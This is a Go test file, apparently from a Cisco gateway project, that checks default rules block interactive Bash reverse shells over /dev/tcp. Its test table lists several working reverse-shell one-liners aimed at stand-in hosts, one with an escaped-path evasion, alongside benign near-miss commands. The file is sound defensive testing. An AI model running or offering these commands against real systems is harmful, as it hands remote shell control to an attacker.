// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package gateway

import "testing"

// The default reverse-shell rules must refuse the exact interactive Bash
// /dev/tcp form on either hook route, including a managed hook peer.
func TestDevTCPInteractiveShellHookCorpus(t *testing.T) {
	judgeR106HookRows(t, []r106HookRow{
		{command: `bash -i >& /dev/tcp/192.0.2.8/4444 0>&1`, block: true},
		{command: `bash -i >& /dev/tcp/relay.invalid/4444 0>&1`, block: true},
		{command: `bash -i >& /de\v/t\cp/relay.invalid/4444 0>&1`, block: true},
		{command: `bash -i >& /dev/tcp/192.0.2.8/4444`, block: true},
		{command: `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`},
		{command: `bash -i >& /dev/tcp/127.1/4444 0>&1`},
		{command: `bash -i >& /dev/null 0>&1`},
		{command: `bash -i > /tmp/session.log 2>&1`},
		{command: `bash -i >& /tmp/session.log 0>&1`},
		{command: `bash -i >& /DEV/TCP/collector.invalid/443 0>&1`},
		{command: `exec 5<>/dev/tcp/collector.invalid/443; exec 5>&-`},
		{command: `bash -c 'exec 5<>/dev/tcp/collector.invalid/443'`},
		{command: `printf health >/dev/tcp/collector.invalid/443`},
		{command: `cat </dev/tcp/collector.invalid/443 >/tmp/response`},
		{command: `bash -ic true >& /dev/tcp/192.0.2.8/4444 0>&1`},
		{command: `printf health >/dev/tcp/192.0.2.8/4444`},
		{command: `printf '%s\n' 'bash -i >& /dev/tcp/192.0.2.8/4444 0>&1'`},
	}, func(*testing.T, b36ManagedHookFixture) {})
}
